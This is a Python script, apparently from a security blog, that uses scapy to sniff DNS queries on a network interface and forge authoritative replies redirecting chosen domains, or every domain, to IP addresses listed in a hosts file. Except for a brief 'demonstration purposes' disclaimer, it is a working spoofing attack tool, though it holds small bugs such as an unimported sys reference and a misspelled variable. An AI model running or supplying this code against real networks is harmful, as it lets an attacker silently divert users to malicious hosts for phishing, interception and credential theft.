#!/usr/bin/env python
# This code is strictly for demonstration purposes.
# If used in any other way or for any other purposes. In no way am I responsible
# for your actions or any damage which may occur as a result of its usage
# dnsSpoof.py
# Author: Nik Alleyne - nikalleyne at gmail dot com
# http://securitynik.blogspot.com

from os import uname
from subprocess import call
from sys import argv, exit
from time import ctime, sleep
from scapy.all import *


def usage():
    print(" Usage: ./dnsSpoof <interface> <IP of your DNS Server - this is more likely the IP on this system>")
    print(" e.g. ./dnsSpoof eth0 [host file]")
    
def testPing(dst1):
    sendp(Ether()/IP(dst=dst1,ttl=(1,4)), iface=argv[1])

def main():

    if len(argv) < 3 :
        usage()
        exit(0)
        
    hosts = sys.argv[2]
    dict = {}
    
    with open(hosts) as f:
        entries = f.readlines()
    for entry in entries:
        columns = entry.split(' ')
        dict[columns[1].strip()] = columns[0]
    print "Loaded dictionary " + str(dict)
  
    while 1:
        getDNSPacket = sniff(iface=argv[1], filter="dst port 53", count=1)
        clientSrcIP = getDNSPacket[0].getlayer(IP).src
        if ( getDNSPacket[0].haslayer(DNS) ) and  ( getDNSPacket[0].getlayer(DNS).qr == 0 ) and (getDNSPacket[0].getlayer(DNS).qd.qtype == 1) and ( getDNSPacket[0].getlayer(DNS).qd.qclass== 1 ):
            #print('\n Got Query on %s ' %ctime())
            clientSrcPort = getDNSPacket[0].getlayer(UDP).sport
            
            if getDNSPacket[0].haslayer(TCP) :
                    clientSrcPort = getDNSPacket[0].getlayer(TCP).sport                  
            else:
                    pass

            clientDNSQueryID = getDNSPacket[0].getlayer(DNS).id
            clientDNSQueryDataCount = getDNSPacket[0].getlayer(DNS).qdcount
            clientDNSServer = getDNSPacket[0].getlayer(IP).dst
            clientDNSQuery = getDNSPacket[0].getlayer(DNS).qd.qname
            for key in dict:
                if clientDNSQuery.find(key) != -1 or key == "*":
                    redirect = dict[key]
                    spoofedIPPkt = IP(src=clientDNSServer,dst=clientSrcIP)           
                    if getDNSPacket[0].haslayer(UDP) :
                        spoofedUDP_TCPPacket = UDP(sport=53,dport=clientSrcPort)
                    elif getDNSPacket[0].haslayer(TCP) :
                        spoofedUDP_TCPPPacket = UDP(sport=53,dport=clientSrcPort)
                    spoofedDNSPakcet = DNS(id=clientDNSQueryID,qr=1,opcode=getDNSPacket[0].getlayer(DNS).opcode,aa=1,rd=0,ra=0,z=0,rcode=0,qdcount=clientDNSQueryDataCount,ancount=1,nscount=1,arcount=1,qd=DNSQR(qname=clientDNSQuery,qtype=getDNSPacket[0].getlayer(DNS).qd.qtype,qclass=getDNSPacket[0].getlayer(DNS).qd.qclass),an=DNSRR(rrname=clientDNSQuery,rdata=redirect.strip(),ttl=86400),ns=DNSRR(rrname=clientDNSQuery,type=2,ttl=86400,rdata=argv[2]),ar=DNSRR(rrname=clientDNSQuery,rdata=redirect.strip()))                       
                    pckToSend = Ether()/spoofedIPPkt/spoofedUDP_TCPPacket/spoofedDNSPakcet
                    sendp(pckToSend,iface=argv[1].strip(), count=1)
                    print "Spoofed DNS packet to redirect " + clientSrcIP +" to " + redirect + " for domain " + clientDNSQuery


if __name__ == '__main__':
    main()
